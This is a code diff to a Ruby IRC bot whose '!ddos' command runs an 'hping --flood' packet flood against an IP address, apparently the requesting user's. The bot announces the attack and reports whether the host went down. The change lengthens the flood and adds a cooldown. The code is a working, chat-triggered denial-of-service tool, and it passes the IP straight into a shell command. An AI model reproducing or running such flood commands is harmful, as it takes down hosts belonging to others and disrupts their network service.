@@ -127,15 +127,18 @@ bot = Cinch::Bot.new do
     m.reply "#{ip} ping> #{str}"
   end
 
+  DDOS_DURATION = "2s"
+  DDOS_WAIT = 5
   on :message, /!ddos #{TARGET}\Z/ do |m|
     @ddos ||= Mutex.new
     if @ddos.try_lock
       begin
         ip = get_ip m
         m.reply "Begin attack against #{ip}"
-        s = `timeout 1s hping --flood '#{ip}' 2>&1`
+        s = `timeout #{DDOS_DURATION} hping --flood '#{ip}' 2>&1`
         s = s.split("\n")[3].to_s
         m.reply (Net::Ping::External.new(ip).ping? ? "failed :(" : "down !!!") + " " + s
+        sleep DDOS_WAIT
         @ddos.unlock
       rescue
         @ddos.unlock
